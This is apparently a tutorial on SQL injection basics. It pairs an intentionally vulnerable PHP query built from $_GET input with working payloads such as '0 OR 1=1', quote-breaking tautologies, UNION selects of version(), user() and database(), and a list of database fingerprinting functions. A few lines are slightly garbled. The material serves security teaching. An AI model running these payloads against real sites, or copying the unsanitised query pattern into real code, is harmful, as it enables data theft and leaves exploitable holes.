
--- SQL Injection Basics ---

• How do SQL injection attacks work
• Basic SQL Injection Examples
• SQL Injection using UNION
• 
• 
• 
• 
• 


-- How do SQL injection attacks work --

In an SQL injection attack, the attacker modifies existing SQL queries by inserting (or ‘injecting’) specifically crafted user input which fools the system into providing more access than intended by the developers of the web application.

➜ Regular interaction between user, web server and database server.

The visitor sends a web request to the web server and requests the information connected with his/her own user id. 
The web server uses this user input to generate an SQL query for the database server. 
At the code level, the SQL query requests all fields from the users table where the user ID equals one. 
The database server executes the query and returns the result set to the web server. 
The web server uses this result set to generate the response page for the visitor. 
Finally, the browser loads the page and the visitor is provided with a webpage containing his/her user information.

➜ Attacker manipulating user input to perform a SQL injection attack.

In this scenario the attacker modifies the usual web request so that the web server generates a SQL query requesting information for all users instead of just one (legitimate) user. 
The database server responds to the SQL query with the full data containing all users. 
This result set is then processed by the web server and the result is displayed to the attacker. 
The attacker has successfully performed an SQL injection attack and retrieved more information from the database than the web application designers intended with this functionality. 


-- Basic SQL Injection Examples --

$userid = $_GET['UserID'];
SQL = "SELECT * FROM Users WHERE UserID = $userid";

SELECT * FROM Users WHERE UserID = 12345;

If we insert '0 OR 1=1' as the UserID (we’re assuming that UserID 0 does not exist). Since 'OR 1=1' always evaluates to true, the SQL query will return all user records

SELECT * FROM Users WHERE UserID = 0 OR 1=1;

***************************************************************************************************

<?php

if(isset($_GET['Submit'])){

    // Retrieve data

    $id = $_GET['id'];

    $getid = "SELECT first_name, last_name FROM users WHERE user_id = '$id'";
    $result = mysql_query($getid) or die('<pre>' . mysql_error() . '</pre>' );

    $num = mysql_numrows($result);

    $i = 0;

    while ($i < $num) {

        $first = mysql_result($result,$i,"first_name");
        $last  = mysql_result($result,$i,"last_name");

        echo '<pre>';
        echo 'ID: ' . $id . '<br>First name: ' . $first . '<br>Surname: ' . $last;
        echo '</pre>';

        $i++;

    }
}
?>

When the form is submitted the user input for the ‘id’ GET form variable is stored in the $id PHP variable. 
The $getid PHP variable in the next line contains the SQL query that selects the first_name and last_name field from table users where the user_id matches input submitted in the GET form (user_id=’$id’). 
This is because the result of the query is ‘true’

SELECT first_name, last_name FROM users WHERE user_id = '1';

0' or '0'='0
SELECT first_name, last_name FROM users WHERE user_id = '0' or '0'='0';


-- SQL Injection using UNION --

The UNION operator in SQL is used to combine two or more result sets from SELECT statements. To use the UNION operator the query has to meet certain requirements:

• Each select statement within UNION must have the same number of columns.
• The columns must have similar or compatible data types.
• The columns in each SELECT statement must be in the same order.

Users table with all the user accounts:

+----------+----------+--------+
| username | password | userid |
+----------+----------+--------+
| user01   | user01   | u0001  |
| user02   | user02   | u0002  |
+----------+----------+--------+

Administrators table with all the administrator accounts:

+----------+----------+--------+
| username | password | userid |
+----------+----------+--------+
| admin01  | admin01  | a0001  |
| admin02  | admin02  | a0002  |
+----------+----------+--------+

Both tables contain exactly the same fields: username, password and userid. If we want to combine both tables in one result set, we can use the UNION operator: 

SELECT * from Users UNION SELECT * from Administrators;

+----------+----------+--------+
| username | password | userid |
+----------+----------+--------+
| user01   | user01   | u0001  |
| user02   | user02   | u0002  |
| admin01  | admin01  | a0001  |
| admin02  | admin02  | a0002  |
+----------+----------+--------+

But what if one of the tables, let’s say the Users table, contained an additional field? In this case the SQL server would throw an error because the number of columns in each table would not match.

0' or 1=1 UNION SELECT null, version() #
SELECT username, password, userid from Users UNION SELECT username, password, userid from Administrators;

0' or 1=1 UNION SELECT user(), database() #
SELECT first_name, last_name FROM users WHERE user_id = '0' or 1=1 UNION SELECT user(), database() #;

We can also use one or more of the following functions to retrieve information about the database, SQL server and tables:

• @@hostname : Current Hostname
• @@tmpdir : Tept Directory
• @@datadir : Data Directory
• @@version : Version of DB
• @@basedir : Base Directory
• user() : Current User
• database() : Current Database
• version() : Version
• schema() : current Database
• UUID() : System UUID key
• current_user() : Current User
























